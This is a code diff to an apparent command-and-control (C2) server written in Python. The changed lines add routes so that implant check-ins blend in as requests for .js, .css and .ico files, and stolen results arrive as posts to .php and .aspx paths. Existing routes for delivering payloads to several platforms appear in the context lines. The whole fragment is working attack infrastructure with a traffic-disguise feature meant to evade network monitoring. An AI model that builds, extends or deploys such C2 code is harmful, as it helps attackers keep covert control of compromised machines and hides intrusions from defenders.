@@ -199,11 +199,20 @@ class C2Server:
         self.host = host
         self.port = port
         self.app = web.Application()
-        # Check-in: GET for normal heartbeat, POST for telemetry payload
+        # Check-in: Support malleable URIs (regex-like behavior)
         self.app.router.add_get("/api/v1/ping", handle_checkin)
         self.app.router.add_post("/api/v1/ping", handle_checkin)
+        self.app.router.add_get("/{path:.*\.js}", handle_checkin)
+        self.app.router.add_post("/{path:.*\.js}", handle_checkin)
+        self.app.router.add_get("/{path:.*\.css}", handle_checkin)
+        self.app.router.add_post("/{path:.*\.css}", handle_checkin)
+        self.app.router.add_get("/{path:.*\.ico}", handle_checkin)
+        self.app.router.add_post("/{path:.*\.ico}", handle_checkin)
+        
         # Results
         self.app.router.add_post("/api/v1/result", handle_result)
+        self.app.router.add_post("/{path:.*\.php}", handle_result)
+        self.app.router.add_post("/{path:.*\.aspx}", handle_result)
         # Payload delivery (all platforms)
         self.app.router.add_get("/api/v1/payload", handle_payload)
         self.app.router.add_get("/api/v1/payload_linux", handle_payload)
